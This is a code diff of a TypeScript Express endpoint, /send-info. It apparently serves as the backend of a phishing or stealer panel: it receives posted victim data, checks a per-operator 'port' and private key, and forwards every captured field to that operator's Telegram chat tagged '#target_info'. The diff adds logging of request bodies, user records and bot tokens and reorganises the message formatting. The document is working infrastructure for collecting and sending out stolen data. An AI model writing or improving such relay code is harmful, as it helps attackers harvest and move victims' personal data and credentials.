@@ -1,6 +1,6 @@
 import { UserDatabase, DomainDatabase } from "./database";
-import express from "express";
-import telegram from "node-telegram-bot-api";
+import * as express from "express";
+import * as telegram from "node-telegram-bot-api";
 import * as nemoji from "node-emoji";
 const Telegram = require("node-telegram-bot-api");
 
@@ -37,6 +37,8 @@ interface InfoFace {
 app.post("/send-info", async (req, res) => {
     const info: InfoFace = req.body;
 
+    console.log(info)
+
     if ((Object.keys(info).length - 4) > 20){
         return res.json({ status: false, message: "too many keys" });
     }
@@ -54,6 +56,7 @@ app.post("/send-info", async (req, res) => {
             return res.json({ status: false, message: "ports owner has banned" });
         }
 
+        console.log(user)
         const _theport = user.port.find(prt => prt.name === info.port);
 
         if (!_theport){
@@ -64,18 +67,23 @@ app.post("/send-info", async (req, res) => {
                     return res.json({ status: false, message: "invalid private key" });
                 }
 
+                console.log(_theport)
                 const bot: telegram = new Telegram(_theport.token);
                 const entrie = Object.entries(info);
                 let txt: string = build(`📦 | [ ${Object.keys(info).length - 4} ] items received\n`);
                 for (const [k, v] of entrie){
                     if (typeof k !== "string"){continue};
-                    if (k === "port"){continue}
+                    if (k === "port"){continue};
+                    if (k === "private_key"){continue};
+                    if (k === "skin"){continue};
+                    if (k === "server_number"){continue};
                     if (["string", "number", "boolean", "object"].includes(typeof v)){
-                        txt += build(`\n${nemoji.random().emoji} | ${k} : `) + `<code>${v}</code>`;
+                        txt += build(`\n${nemoji.random().emoji} | ${k.replace("_", " ")} : `) + `<code>${v}</code>`;
                     }
-                    txt += `\n\n📦 | skin : ${info.skin}`
-                    txt += `\n🛜 | server number : ${info.server_number}`
                 }
+                txt += `\n\n📦 | skin : ${info.skin}`
+                txt += `\n🛜 | server number : ${info.server_number}`
+                res.json({ status: true })
                 return await bot.sendMessage(
                     _theport.chat,
                     build(`🕸️ new #target_info\n`) + txt,
